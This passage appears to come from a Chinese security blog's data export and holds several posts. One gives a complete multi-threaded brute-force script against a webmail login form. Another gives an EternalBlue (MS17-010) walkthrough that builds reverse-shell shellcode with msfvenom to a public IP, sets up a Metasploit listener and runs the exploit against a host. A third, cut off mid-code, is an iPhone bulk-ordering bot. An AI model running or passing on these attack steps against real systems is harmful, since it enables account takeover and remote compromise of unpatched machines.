class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python3</div><div class=\"line\"># -*- coding: utf-8 -*-</div><div class=\"line\"></div><div class=\"line\">import logging</div><div class=\"line\">import argparse</div><div class=\"line\">import queue</div><div class=\"line\">import requests</div><div class=\"line\">import threading</div><div class=\"line\">import os</div><div class=\"line\">import time</div><div class=\"line\">import random</div><div class=\"line\">from html.parser import HTMLParser</div><div class=\"line\">from requests.packages.urllib3.exceptions import InsecureRequestWarning</div><div class=\"line\"></div><div class=\"line\">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class=\"line\"># disable InsecureRequestWarning</div><div class=\"line\"># 由于目标站点使用的证书过期了，导致我在使用requests库请求时将verify设置为FALSE，同时配置了proxies(指向本地Burp)。而requests依赖的底层库urllib3总是报Warning，所以使用上面语句disable掉这个Warning。可以参考如下链接：</div><div class=\"line\"># https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pytho</div><div class=\"line\"></div><div class=\"line\">logging.basicConfig(level=logging.WARNING)       # 用logging,避免调试时满篇的print.（但本脚本中基本没怎么用。。。）</div><div class=\"line\"></div><div class=\"line\"># general settings</div><div class=\"line\"></div><div class=\"line\">target_url=&quot;https://mail.xxx.com/UserLogin.aspx&quot;</div><div class=\"line\"></div><div class=\"line\">writeFileLock = threading.Lock()    # 创建文件锁，避免写文件冲突。</div><div class=\"line\">threadLock = threading.Lock()    #创建线程锁，避免对显示效果的影响。</div><div class=\"line\"></div><div class=\"line\"># 保存爆破结果</div><div class=\"line\">def saveFile(message,outfilePath):</div><div class=\"line\">    with open(outfilePath, &apos;a+&apos;, encoding = &apos;utf8&apos;) as f:  # 以追加的方法结果写入文件</div><div class=\"line\">        f.write(message[0]+&quot;\\t&quot;)</div><div class=\"line\">        f.write(message[1]+&quot;\\n&quot;)</div><div class=\"line\"></div><div class=\"line\"># 自定义一个Exception类,用于显示自定义的异常。</div><div class=\"line\">class validcodeException(BaseException):</div><div class=\"line\">    def __init__(self,mesg=&quot; @@@@@@@@@@@@@@@         valid code is wrong!!!!!!!&quot;):</div><div class=\"line\">        print(mesg)</div><div class=\"line\"></div><div class=\"line\"># 解析响应报文，主要用户提取服务器响应回来的表单字段，顶好用的玩意儿。官方文档：https://docs.python.org/3.6/library/html.parser.html?highlight=htmlparser</div><div class=\"line\">class BruteParser(HTMLParser):</div><div class=\"line\">    def __init__(self):</div><div class=\"line\">        HTMLParser.__init__(self)</div><div class=\"line\">        self.tag_results = &#123;&#125;</div><div class=\"line\"></div><div class=\"line\">    def handle_starttag(self, tag, attrs):</div><div class=\"line\">        if tag == &quot;input&quot;:</div><div class=\"line\">            tag_name = None</div><div class=\"line\">            tag_value = None</div><div class=\"line\">            for name, value in attrs:</div><div class=\"line\">                if name == &quot;name&quot;:</div><div class=\"line\">                    tag_name = value</div><div class=\"line\">                if name == &quot;value&quot;:</div><div class=\"line\">                    tag_value = value</div><div class=\"line\">            if (tag_name == &quot;__VIEWSTATE&quot;) or (tag_name == &quot;__VIEWSTATEGENERATOR&quot;) or (tag_name == &quot;__EVENTVALIDATION&quot;):</div><div class=\"line\">                self.tag_results[tag_name] = tag_value</div><div class=\"line\"></div><div class=\"line\"># 核心实现类</div><div class=\"line\">class Bruter(object):</div><div class=\"line\">    def __init__(self, threads,userList,pwdList,outfilePath):</div><div class=\"line\">        self.user_q=userList</div><div class=\"line\">        self.pwdlist=list(pwdList.queue)      # 对于每个用户名，密码列表需要重复使用，所以不合适用队列，故而转换为list。</div><div class=\"line\">        self.threads=threads</div><div class=\"line\">        self.outfilePath=outfilePath</div><div class=\"line\">        print(&quot;Total %d(%d * %d) tries( %d threads)&quot;% (self.user_q.qsize()*len(self.pwdlist),self.user_q.qsize(),len(self.pwdlist),self.threads))</div><div class=\"line\"></div><div class=\"line\">    # 线程的创建与管理</div><div class=\"line\">    def run_bruteforce(self):</div><div class=\"line\">        thread_arr=[]       # 线程列表list</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            t = threading.Thread(target=self.web_bruter)</div><div class=\"line\">            thread_arr.append(t)            # 创建线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].start()           # 开启线程</div><div class=\"line\">        for i in range(self.threads):</div><div class=\"line\">            thread_arr[i].join()            # 回归线程</div><div class=\"line\"></div><div class=\"line\">    # 核心方法</div><div class=\"line\">    def web_bruter(self):</div><div class=\"line\">        proxies = &#123; </div><div class=\"line\">            &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;, </div><div class=\"line\">            &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;, </div><div class=\"line\">        &#125;       # Burpsuite的代理地址</div><div class=\"line\"></div><div class=\"line\">        # 初始化cookie以及hidden元素数据。</div><div class=\"line\">        response = requests.get(target_url,proxies=proxies,verify=False)</div><div class=\"line\">        cookie=response.cookies</div><div class=\"line\"></div><div class=\"line\">        # 解析异常表单字段</div><div class=\"line\">        parser = BruteParser()</div><div class=\"line\">        parser.feed(response.text)</div><div class=\"line\">        post_tags = parser.tag_results</div><div class=\"line\">        post_tags[&apos;cmdSubmit.x&apos;]=random.randint(1,47)       # 登录按钮图片 47x39像素</div><div class=\"line\">        post_tags[&apos;cmdSubmit.y&apos;]=random.randint(1,39)</div><div class=\"line\"></div><div class=\"line\">        # 从队列中取需要爆破的用户名，在多线程中使用queue比较方便。</div><div class=\"line\">        while not self.user_q.empty():</div><div class=\"line\">            username = self.user_q.get().rstrip().decode(&quot;ascii&quot;)</div><div class=\"line\">            for password in self.pwdlist:</div><div class=\"line\">                password=password.decode(&quot;ascii&quot;)</div><div class=\"line\">                post_tags[&quot;txtUsername&quot;]=username</div><div class=\"line\">                post_tags[&quot;txtPassword&quot;]=password</div><div class=\"line\">                </div><div class=\"line\">                threadLock.acquire()    # 取得线程锁，使用线程锁，避免出现显示效果被打乱的情况。</div><div class=\"line\">                # \\r将光标回退到行首（\\b回退一格）,实现原地覆盖。</div><div class=\"line\">                print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)       # 退两格，清空一格。 实现清空。</div><div class=\"line\">                print(&quot;\\rTrying: %15s : %15s  (%d users left)&quot; % (username,password, self.user_q.qsize()),end=&quot;&quot;)</div><div class=\"line\">                #time.sleep(2)          # 调试时使用的</div><div class=\"line\">                threadLock.release()    # 释放线程锁</div><div class=\"line\">                reqResult = requests.post(target_url,data=post_tags,cookies=cookie,allow_redirects=True,proxies=proxies,verify=False)</div><div class=\"line\"></div><div class=\"line\">                if (&quot;欢迎使用XXX邮件系统&quot; in reqResult.text):   # 爆破成功</div><div class=\"line\">                    threadLock.acquire()    # 取得线程锁</div><div class=\"line\">                    print(&quot; \\b\\b&quot;*100,end=&quot;&quot;)</div><div class=\"line\">                    print (&quot;\\r[*] --&gt;  %15s\\t%15s&quot; % (username,password))   # 打印到窗口</div><div class=\"line\">                    #time.sleep(2)</div><div class=\"line\">                    threadLock.release()    # 释放线程锁</div><div class=\"line\">                    if self.outfilePath is not None:    # 输出到文件</div><div class=\"line\">                        # 获取文件锁</div><div class=\"line\">                        writeFileLock.acquire()</div><div class=\"line\">                        try:</div><div class=\"line\">                            # 追加到文件</div><div class=\"line\">                            saveFile((username,password),self.outfilePath)</div><div class=\"line\">                        finally:</div><div class=\"line\">                            # 释放锁</div><div class=\"line\">                            writeFileLock.release()</div><div class=\"line\">                    break   # 跳出当前循环，进行下一个用户名爆破</div><div class=\"line\">                if (&quot;您输入的验证码不正确，请重新输入!&quot; in reqResult.text): # 验证码错误，抛出异常！</div><div class=\"line\">                    raise validcodeException(&quot;验证码错误，需要检查代码！！！！☆☆☆☆☆☆☆&quot;)</div><div class=\"line\">                    exit    # 退出！ 理论上不会执行这一句。</div><div class=\"line\">                # 由于该登陆点存在验证码失效的问题，所以按理不会出现验证码不准确的情况，故而，也没继续完善代码。 如有需要，可自行完善。</div><div class=\"line\"></div><div class=\"line\">                if  (&quot;对不起, 您输入的用户名或口令错误, 请重新输入。&quot; in reqResult.text):</div><div class=\"line\">                    pass        # 占一个坑，没鸟用</div><div class=\"line\">                pass</div><div class=\"line\"></div><div class=\"line\">                #time.sleep(2)</div><div class=\"line\"># 读取文件，生成队列</div><div class=\"line\">def build_list(listFile):   </div><div class=\"line\">    # read in the list file</div><div class=\"line\">    fd = open(listFile, &quot;rb&quot;)</div><div class=\"line\">    raw_words = fd.readlines()</div><div class=\"line\">    fd.close()</div><div class=\"line\"></div><div class=\"line\">    words = queue.Queue()</div><div class=\"line\"></div><div class=\"line\">    for word in raw_words:</div><div class=\"line\">        word = word.rstrip()</div><div class=\"line\">        words.put(word)</div><div class=\"line\">    return words</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">def main():</div><div class=\"line\">    headCharPic=&quot;\\r        .--.\\n       |o_o |    ------------------ \\n       |:_/ |   &lt; Author: Mr.Bingo &gt;\\n      //   \\ \\   ------------------ \\n     (|     | ) &lt;    oddboy.cn     &gt;\\n    /&apos;\\_   _/`\\  ------------------\\n    \\___)=(___/\\n&quot;</div><div class=\"line\">    print(headCharPic)</div><div class=\"line\">    # 创建一个argparser解析器</div><div class=\"line\">    parser=argparse.ArgumentParser(</div><div class=\"line\">        prog=&quot;BingoBF&quot;,</div><div class=\"line\">        usage=&quot; %(prog)s [options] &quot;,</div><div class=\"line\">        description=&apos;Brute Force 【https://mail.xxx.com] email\\&apos;s passwords.&apos;,</div><div class=\"line\">        epilog=&quot;+---+\\n&quot;</div><div class=\"line\">        )</div><div class=\"line\"></div><div class=\"line\">    groupUser = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupUser.add_argument(&apos;-u&apos;,dest=&quot;username&quot;,help=&quot;username&quot;)</div><div class=\"line\">    groupUser.add_argument(&apos;-U&apos;,dest=&apos;userList&apos;,help=&quot;usernames&quot;)</div><div class=\"line\"></div><div class=\"line\">    groupPwd = parser.add_mutually_exclusive_group(required=True)</div><div class=\"line\">    groupPwd.add_argument(&apos;-p&apos;,dest=&quot;password&quot;,help=&quot;password&quot;)</div><div class=\"line\">    groupPwd.add_argument(&apos;-P&apos;,dest=&apos;pwdList&apos;,help=&quot;passwords&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&apos;-o&apos;,dest=&apos;output&apos;,help=&quot;print results to file&quot;)</div><div class=\"line\"></div><div class=\"line\">    parser.add_argument(&quot;-t&quot;,dest=&quot;thread&quot;,type=int,help=&quot;mutli threads, default 3 threads&quot;,default=3)</div><div class=\"line\"></div><div class=\"line\">    args=parser.parse_args()    # 命令行参数解析</div><div class=\"line\">    </div><div class=\"line\">    if args.username is not None:</div><div class=\"line\">        userList=list(args.username)</div><div class=\"line\">    else:</div><div class=\"line\">        userList = build_list(args.userList)</div><div class=\"line\">    if args.password is not None:</div><div class=\"line\">        pwdList=list(args.password)</div><div class=\"line\">    else:</div><div class=\"line\">        pwdList = build_list(args.pwdList)</div><div class=\"line\"></div><div class=\"line\">    outfilePath = None</div><div class=\"line\">    if args.output is not None:</div><div class=\"line\">        outfilePath = args.output</div><div class=\"line\">        filePath,fileName=os.path.split(outfilePath)</div><div class=\"line\">        if (filePath!=&quot;&quot;) and (not os.path.exists(filePath)):</div><div class=\"line\">            os.mikedirs(filePath)   # 若不存在这个目录则递归创建</div><div class=\"line\"></div><div class=\"line\">    if args.thread is not None:</div><div class=\"line\">        user_thread=args.thread</div><div class=\"line\"></div><div class=\"line\">    bruter_obj = Bruter(user_thread,userList,pwdList,outfilePath)</div><div class=\"line\">    bruter_obj.run_bruteforce()</div><div class=\"line\"></div><div class=\"line\">if __name__ == &apos;__main__&apos;:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>\n<h2 id=\"调用sample\"><a href=\"#调用sample\" class=\"headerlink\" title=\"调用sample\"></a>调用sample</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">➜ ~ python3 BingoBF.py -U user.txt -P pwd.txt -o Outfile.txt</div></pre></td></tr></table></figure>\n<h2 id=\"附赠\"><a href=\"#附赠\" class=\"headerlink\" title=\"附赠\"></a>附赠</h2><p>命令行中显示的企鹅字符画是用一个叫cowsay的工具弄的，感兴趣自己百谷。</p>"},{"title":"ms17-010 python脚本exploit","date":"2017-08-22T09:15:40.000Z","_content":"\n脚本github : https://github.com/worawit/MS17-010\n\n<!-- more -->\n\n## 生成shellCode\n```\n nasm -f bin eternalblue_kshellcode_x86.asm -o eternalblue_kshellcode_x86.bin           # 32位kernel code\n\n nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin           # 64位kernel code\n\n\n msfvenom -p windows/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x86_ms17010_sunny5910.raw EXITFUNC=thread       # 32位msf reverse_tcp code\n\n msfvenom -p windows/x64/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x64_ms17010_sunny5910.raw EXITFUNC=thread   # 64位msf reverse_tcp code\n\n\n cat eternalblue_kshellcode_x64.bin msf_shellcode_x64_ms17010_sunny5910.raw > shellcode_sunny5910_x64.bin       # 64位代码整合\n\n cat eternalblue_kshellcode_x86.bin msf_shellcode_x86_ms17010_sunny5910.raw > shellcode_sunny5910_x86.bin       # 32位代码整合\n\n\n python eternalblue_sc_merge.py shellcode_sunny5910_x64.bin shellcode_sunny5910_x86.bin shellcode_sunny5910_all.bin         # x86与x64代码整理（实际中有出现蓝屏，原因未知）\n```\n## 本地接收shell\n```\nsunny clientid e6cc2bd36aXXXXXXX     (个人id, 5910端口映射)\n\nmsfconsole          # 启动MSF\n\nuse exploit/multi/handler\n\nset lhost 0.0.0.0\n\nset lport 5910\n\nrun\n\n```\n\n## 攻击\neternalblue_exploit7.py  ::  Eternalblue exploit for Windows 7/2008\neternalblue_exploit8.py  ::  Eternalblue exploit for windows 8/2012 x64\n\n```\npython eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_all.bin         # 攻击导致蓝屏\n\npython eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_x64.bin         # 攻击成功\n```\n","source":"_posts/ms17-010-python脚本exploit.md","raw":"---\ntitle: ms17-010 python脚本exploit\ndate: 2017-08-22 17:15:40\ntags: ms17-010\n---\n\n脚本github : https://github.com/worawit/MS17-010\n\n<!-- more -->\n\n## 生成shellCode\n```\n nasm -f bin eternalblue_kshellcode_x86.asm -o eternalblue_kshellcode_x86.bin           # 32位kernel code\n\n nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin           # 64位kernel code\n\n\n msfvenom -p windows/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x86_ms17010_sunny5910.raw EXITFUNC=thread       # 32位msf reverse_tcp code\n\n msfvenom -p windows/x64/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x64_ms17010_sunny5910.raw EXITFUNC=thread   # 64位msf reverse_tcp code\n\n\n cat eternalblue_kshellcode_x64.bin msf_shellcode_x64_ms17010_sunny5910.raw > shellcode_sunny5910_x64.bin       # 64位代码整合\n\n cat eternalblue_kshellcode_x86.bin msf_shellcode_x86_ms17010_sunny5910.raw > shellcode_sunny5910_x86.bin       # 32位代码整合\n\n\n python eternalblue_sc_merge.py shellcode_sunny5910_x64.bin shellcode_sunny5910_x86.bin shellcode_sunny5910_all.bin         # x86与x64代码整理（实际中有出现蓝屏，原因未知）\n```\n## 本地接收shell\n```\nsunny clientid e6cc2bd36aXXXXXXX     (个人id, 5910端口映射)\n\nmsfconsole          # 启动MSF\n\nuse exploit/multi/handler\n\nset lhost 0.0.0.0\n\nset lport 5910\n\nrun\n\n```\n\n## 攻击\neternalblue_exploit7.py  ::  Eternalblue exploit for Windows 7/2008\neternalblue_exploit8.py  ::  Eternalblue exploit for windows 8/2012 x64\n\n```\npython eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_all.bin         # 攻击导致蓝屏\n\npython eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_x64.bin         # 攻击成功\n```\n","slug":"ms17-010-python脚本exploit","published":1,"updated":"2017-08-22T09:33:10.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfst000r97uvswtyybrw","content":"<p>脚本github : <a href=\"https://github.com/worawit/MS17-010\" target=\"_blank\" rel=\"external\">https://github.com/worawit/MS17-010</a></p>\n<a id=\"more\"></a>\n<h2 id=\"生成shellCode\"><a href=\"#生成shellCode\" class=\"headerlink\" title=\"生成shellCode\"></a>生成shellCode</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nasm -f bin eternalblue_kshellcode_x86.asm -o eternalblue_kshellcode_x86.bin           # 32位kernel code</div><div class=\"line\"></div><div class=\"line\">nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin           # 64位kernel code</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">msfvenom -p windows/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x86_ms17010_sunny5910.raw EXITFUNC=thread       # 32位msf reverse_tcp code</div><div class=\"line\"></div><div class=\"line\">msfvenom -p windows/x64/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x64_ms17010_sunny5910.raw EXITFUNC=thread   # 64位msf reverse_tcp code</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">cat eternalblue_kshellcode_x64.bin msf_shellcode_x64_ms17010_sunny5910.raw &gt; shellcode_sunny5910_x64.bin       # 64位代码整合</div><div class=\"line\"></div><div class=\"line\">cat eternalblue_kshellcode_x86.bin msf_shellcode_x86_ms17010_sunny5910.raw &gt; shellcode_sunny5910_x86.bin       # 32位代码整合</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">python eternalblue_sc_merge.py shellcode_sunny5910_x64.bin shellcode_sunny5910_x86.bin shellcode_sunny5910_all.bin         # x86与x64代码整理（实际中有出现蓝屏，原因未知）</div></pre></td></tr></table></figure>\n<h2 id=\"本地接收shell\"><a href=\"#本地接收shell\" class=\"headerlink\" title=\"本地接收shell\"></a>本地接收shell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">sunny clientid e6cc2bd36aXXXXXXX     (个人id, 5910端口映射)</div><div class=\"line\"></div><div class=\"line\">msfconsole          # 启动MSF</div><div class=\"line\"></div><div class=\"line\">use exploit/multi/handler</div><div class=\"line\"></div><div class=\"line\">set lhost 0.0.0.0</div><div class=\"line\"></div><div class=\"line\">set lport 5910</div><div class=\"line\"></div><div class=\"line\">run</div></pre></td></tr></table></figure>\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p>eternalblue_exploit7.py  ::  Eternalblue exploit for Windows 7/2008<br>eternalblue_exploit8.py  ::  Eternalblue exploit for windows 8/2012 x64</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_all.bin         # 攻击导致蓝屏</div><div class=\"line\"></div><div class=\"line\">python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_x64.bin         # 攻击成功</div></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>脚本github : <a href=\"https://github.com/worawit/MS17-010\">https://github.com/worawit/MS17-010</a></p>","more":"<h2 id=\"生成shellCode\"><a href=\"#生成shellCode\" class=\"headerlink\" title=\"生成shellCode\"></a>生成shellCode</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">nasm -f bin eternalblue_kshellcode_x86.asm -o eternalblue_kshellcode_x86.bin           # 32位kernel code</div><div class=\"line\"></div><div class=\"line\">nasm -f bin eternalblue_kshellcode_x64.asm -o eternalblue_kshellcode_x64.bin           # 64位kernel code</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">msfvenom -p windows/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x86_ms17010_sunny5910.raw EXITFUNC=thread       # 32位msf reverse_tcp code</div><div class=\"line\"></div><div class=\"line\">msfvenom -p windows/x64/shell/reverse_tcp lhost=47.90.92.56 lport=5910 -f raw -o msf_shellcode_x64_ms17010_sunny5910.raw EXITFUNC=thread   # 64位msf reverse_tcp code</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">cat eternalblue_kshellcode_x64.bin msf_shellcode_x64_ms17010_sunny5910.raw &gt; shellcode_sunny5910_x64.bin       # 64位代码整合</div><div class=\"line\"></div><div class=\"line\">cat eternalblue_kshellcode_x86.bin msf_shellcode_x86_ms17010_sunny5910.raw &gt; shellcode_sunny5910_x86.bin       # 32位代码整合</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">python eternalblue_sc_merge.py shellcode_sunny5910_x64.bin shellcode_sunny5910_x86.bin shellcode_sunny5910_all.bin         # x86与x64代码整理（实际中有出现蓝屏，原因未知）</div></pre></td></tr></table></figure>\n<h2 id=\"本地接收shell\"><a href=\"#本地接收shell\" class=\"headerlink\" title=\"本地接收shell\"></a>本地接收shell</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">sunny clientid e6cc2bd36aXXXXXXX     (个人id, 5910端口映射)</div><div class=\"line\"></div><div class=\"line\">msfconsole          # 启动MSF</div><div class=\"line\"></div><div class=\"line\">use exploit/multi/handler</div><div class=\"line\"></div><div class=\"line\">set lhost 0.0.0.0</div><div class=\"line\"></div><div class=\"line\">set lport 5910</div><div class=\"line\"></div><div class=\"line\">run</div></pre></td></tr></table></figure>\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p>eternalblue_exploit7.py  ::  Eternalblue exploit for Windows 7/2008<br>eternalblue_exploit8.py  ::  Eternalblue exploit for windows 8/2012 x64</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_all.bin         # 攻击导致蓝屏</div><div class=\"line\"></div><div class=\"line\">python eternalblue_exploit7.py 10.1.1.4 shellcode_sunny5910_x64.bin         # 攻击成功</div></pre></td></tr></table></figure>"},{"title":"iPhoneX抢购Python脚本","date":"2017-10-31T07:34:19.000Z","_content":"\n## 叨逼叨\n原本以为iPhone X会被疯抢，所谓八仙过海各显神通，我就想着用自己的野路子看看凑效不？\n\n经过几天的流程梳理，代码编写及优化，在27号前夕以iPhone 8作为测试，效果是灰常的好！\n<!--more-->\n![](iPhoneX抢购Python脚本/image01.jpg)\n\n批量下单(iphone8/8p),跑了40个订单,每个订单一条线程，20秒左右全部订单成功，邮箱也瞬间收到几十封邮件：\n\n![](iPhoneX抢购Python脚本/image02.png)\n\n## 失落的转折\n27日早上开始，苹果官网下单功能维护，直到下午三点功能才正常。 不过，在购物车跳转到支付页面的相关参数被改动了。所以，gg了！\n\n![](iPhoneX抢购Python脚本/image03.png)\n\n## 记录总结一下 | 付出总会有收获\n\n几天过去了，今天回过头来稍微整理下，记录下来，好歹也付出过不是？\n\n今天再次查看苹果网站，之前修改的参数点现在又修改回去了。不过在最后的下订单环节应该有增加了一些防护，所以我的脚本还是不能用。\n\n-----\n- python可以直接读取json文件转换为dict.非常好用！\n- 用datetime库来判断时间点：\n    ```python\n    tmp= datetime.datetime(2017,10,27,6,58).timestamp()-time.timezone - datetime.datetime.now().timestamp()\n    if tmp>0:  # UTC时间！   \n        print(orderIdentify+\"🤕\\tiphone X 尚未起售！ == %d minutes ==\"%(tmp/60))\n        return```\n- 使用requests.session类来处理多步骤的请求，可以自动处理cookie问题，自动重试功能也非常赞！\n    ```python\n    session=requests.session()      # session会话可以自动保存和处理cookie\n    session.proxies=proxies\n    session.verify=False\n    session.timeout=30          # 此处设置timeout无用\n    session.headers={'User-Agent':userAgent}\n    # https://stackoverflow.com/questions/15431044/can-i-set-max-retries-for-requests-request/\n    session.mount('https://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))     # 实际会重试 max_retries +1 次   所以将retry次数先减1\n    session.mount('http://', requests.adapters.HTTPAdapter(max_retries=retryTime-1))\n    ```\n- 也许直接使用浏览器模拟器是更好的选择（如mechanize selenium），虽然“重”了些，但简单易处理。\n\n## 上代码 | 感兴趣的拿走不谢\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Author : Mr.Bingo\n# Version : 2.0\n# Description : \n\nimport pdb\nimport requests\nimport logging\nimport json\nimport sys\nimport os\nimport re\nimport threading\nimport datetime,time\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nlogging.basicConfig(level=logging.INFO)\n\n\n#orderPath= os.path.join(os.path.split(os.path.abspath(__file__))[0],u'order')     # json文件格式订单\norderFile= os.path.join(os.path.split(os.path.abspath(__file__))[0],'order.txt')    # txt订单格式\n#   lastName | firstName | phone | email | state | city | district | street | payment | product | color | capacity | quantity\n#   邓 | 六 | 15000555000 | test3@oddboy.cn | 北京 | 北京 | 海淀区 | XXX路17号 | Alipay | iphone8 | glod | 256gb | 2\norderResult = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Result.csv')  # 成功订单\n\n# orderSuccess = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Success.txt')  # 成功订单\n# orderFail = os.path.join(os.path.split(os.path.abspath(__file__))[0],'order-Fail.txt')  # 失败订单\n\nclass iPhoneBuyer(object):\n    # 初始化\n    def __init__(self):\n        self.dispData=[]    # list\n        self.threadLock = threading.Lock()  # 进程锁，主要用于写文件！\n        pass\n\n    # 多线程情况下美化，格式化输出消息。\n    def display(self):\n        pass\n\n    # 开启多线程 一个订单一个线程\n    def run_Threads(self):\n        thread_arr=[]       # 线程列表\n        threading.Thread(target=self.display)     \n\n        # json文件格式订单读取\n        # logging.info(\"\\r[info] Order Path : %s \"%orderPath[:80])\n        # for dirpath,dirname,files in os.walk(orderPath):\n        #     print(files)\n        #     for f in files:\n        #         if re.match(r'^order.*\\.json$',f):\n        #             f=os.path.join(orderPath,f)\n        #             logging.info(f)\n        #             with open(f,encoding='utf-8') as fp:\n        #                 order=json.load(fp)\n        #                 order['fileFullName']= f\n        #                 logging.debug(order)\n        #                 print(\"\\n> order's phone :: \"+order['phone'])\n        #                 #pdb.set_trace()\n        #                 t=threading.Thread(target=self.buy,args=(order,))\n        #                 thread_arr.append(t)\n\n        if not os.path.exists(orderFile):\n            print(\"没有订单文件！！！\")\n            sys.exit(0)\n        \n        with open(orderFile,encoding='utf-8') as fp:\n            raw_orders = fp.readlines()\n            tmp = False\n            for raw_order in raw_orders:\n                if not tmp:\n                    tmp =True\n                    continue    # 跳过order.txt文件的第一行\n              \n                raw_order = str(raw_order).replace(' ','')  # 删除所有空格\n                logging.debug(raw_order)\n                if not re.match(r'^((.*?\\|){13})',raw_order):      # 简单检查订单格式\n                    continue\n                l = raw_order.split(\"|\")\n                order={}\n                